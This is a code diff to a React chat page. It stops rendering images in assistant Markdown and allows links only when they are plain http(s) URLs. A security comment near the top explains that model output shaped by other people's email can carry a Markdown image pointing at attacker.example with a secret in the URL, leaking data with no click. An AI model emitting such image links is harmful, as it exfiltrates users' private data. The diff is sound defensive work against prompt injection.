@@ -39,17 +39,28 @@ const STARTERS = [
 // of bold text. Found by actually looking at the rendered page, not by
 // checking the API response alone. Only assistant messages go through this
 // — a user's own typed input has no reason to be parsed as Markdown.
+//
+// SECURITY: the answer text is produced by a model that has read email and
+// documents other people wrote, so it must be treated as untrusted. An
+// image in it (`![](https://attacker.example/?d=<secret>)`) would make the
+// browser fetch that address automatically, carrying data out with no click.
+// Images are therefore never rendered (see `disallowedElements` where this
+// is used, and the img-src CSP in next.config.ts as the second layer), and a
+// link only becomes clickable if it is a plain http(s) URL.
 const markdownComponents: Components = {
   p: ({ children }) => <p className="whitespace-pre-wrap">{children}</p>,
   strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
   ul: ({ children }) => <ul className="list-disc pl-4 space-y-0.5">{children}</ul>,
   ol: ({ children }) => <ol className="list-decimal pl-4 space-y-0.5">{children}</ol>,
   li: ({ children }) => <li>{children}</li>,
-  a: ({ href, children }) => (
-    <a href={href} target="_blank" rel="noreferrer" className="underline underline-offset-2">
-      {children}
-    </a>
-  ),
+  a: ({ href, children }) =>
+    href && /^https?:\/\//i.test(href) ? (
+      <a href={href} target="_blank" rel="noreferrer noopener nofollow" className="underline underline-offset-2">
+        {children}
+      </a>
+    ) : (
+      <span>{children}</span>
+    ),
 };
 
 export default function ChatPage() {
@@ -175,7 +186,7 @@ export default function ChatPage() {
                       }
                     >
                       {m.role === "assistant" ? (
-                        <ReactMarkdown components={markdownComponents}>{m.content}</ReactMarkdown>
+                        <ReactMarkdown components={markdownComponents} disallowedElements={["img"]}>{m.content}</ReactMarkdown>
                       ) : (
                         <p className="whitespace-pre-wrap">{m.content}</p>
                       )}
